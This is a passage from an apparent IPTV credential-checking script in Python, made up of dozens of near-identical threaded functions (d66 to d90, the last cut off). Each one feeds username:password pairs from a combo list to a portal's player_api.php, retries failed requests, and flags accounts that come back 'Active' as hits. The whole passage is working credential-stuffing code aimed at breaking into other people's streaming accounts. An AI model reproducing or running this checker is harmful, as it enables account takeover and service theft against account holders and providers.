            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d66():
    global hit
    say = 0
    for fyz in range(66, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_66'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d67():
    global hit
    say = 0
    for fyz in range(67, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_67'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d68():
    global hit
    say = 0
    for fyz in range(68, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_68'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d69():
    global hit
    say = 0
    for fyz in range(69, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_69'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d70():
    global hit
    say = 0
    for fyz in range(70, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_70'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d71():
    global hit
    say = 0
    for fyz in range(71, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_71'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d72():
    global hit
    say = 0
    for fyz in range(72, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_72'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d73():
    global hit
    say = 0
    for fyz in range(73, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_73'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d74():
    global hit
    say = 0
    for fyz in range(74, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_74'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d75():
    global hit
    say = 0
    for fyz in range(75, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_75'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d76():
    global hit
    say = 0
    for fyz in range(76, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_76'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d77():
    global hit
    say = 0
    for fyz in range(77, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_77'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 ?? 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d78():
    global hit
    say = 0
    for fyz in range(78, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_78'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d79():
    global hit
    say = 0
    for fyz in range(79, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_79'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d80():
    global hit
    say = 0
    for fyz in range(80, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_80'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d81():
    global hit
    say = 0
    for fyz in range(81, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_81'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d82():
    global hit
    say = 0
    for fyz in range(82, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_82'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d83():
    global hit
    say = 0
    for fyz in range(83, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_83'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d84():
    global hit
    say = 0
    for fyz in range(84, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_84'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d85():
    global hit
    say = 0
    for fyz in range(85, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_85'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d86():
    global hit
    say = 0
    for fyz in range(86, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_86'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d87():
    global hit
    say = 0
    for fyz in range(87, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_87'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d88():
    global hit
    say = 0
    for fyz in range(88, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_88'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d89():
    global hit
    say = 0
    for fyz in range(89, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_89'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d90():
    global hit
    say = 0
    for fyz in range(90, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
